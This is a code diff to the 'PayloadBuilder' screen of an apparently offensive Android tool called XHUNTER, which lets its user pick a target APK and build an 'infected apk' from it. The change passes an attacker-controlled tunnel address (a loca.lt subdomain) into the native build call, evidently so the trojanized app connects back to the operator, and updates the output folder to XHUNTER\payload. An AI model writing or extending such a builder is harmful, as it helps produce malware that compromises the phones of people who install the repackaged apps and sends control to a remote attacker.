@@ -18,7 +18,7 @@ import { TouchableOpacity } from "react-native";
 // native module
 import AppBuilder from '../../native-modules/AppBuilder'
 // redux
-import { useDispatch } from '../../redux/store';
+import { useDispatch, useSelector } from '../../redux/store';
 import { addBuildPayloadLogs } from '../../redux/slices/userInfo'
 // components
 import BuildLogScreen from '../../components/BuildLogScreen'
@@ -26,6 +26,7 @@ import BuildLogScreen from '../../components/BuildLogScreen'
 const PayloadBuilder = ({navigation}) => {
     const toast = useToast();
     const dispatch = useDispatch();
+    const { subdomain } = useSelector((state) => state.userInfo);
 
     const [targetApk,setTargetApk]=useState();
     const [visible, setVisible]= useState(false);
@@ -67,7 +68,7 @@ const PayloadBuilder = ({navigation}) => {
             RNFetchBlob.fs.stat(targetApk.uri).then((stats) => { 
                 if(stats.path){
                     setVisible(true)
-                    AppBuilder.build(stats.path, addlog);
+                    AppBuilder.build(stats.path,`https://${subdomain}.loca.lt`, addlog);
                 }else{
                     toast.show({
                         title: "Target apk selected corrupt",
@@ -134,7 +135,7 @@ const PayloadBuilder = ({navigation}) => {
         <Text fontSize={'14'}  color={"error.600"}>{"*Please be patient during apk build, as it usually takes few minutes to complete"}</Text>
         <Text fontSize={'14'}  color={"error.600"}>{"*If it fails to build apk them try another apk"}</Text>
         <Text fontSize={'14'}  color={"error.600"}>{"*It takes around 10-20 minutes to build. [ may differ on apk size ]"}</Text>
-        <Text fontSize={'14'}  color={"error.600"}>{"*After build success, the infected apk will be located in \"XHUNTER\" named folder in your internal storage "}</Text>
+        <Text fontSize={'14'}  color={"error.600"}>{"*After build success, the infected apk will be located in \"XHUNTER\\payload\" named folder in your internal storage "}</Text>
     </Box>
     <Spacer/>
     <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} mb="10" borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
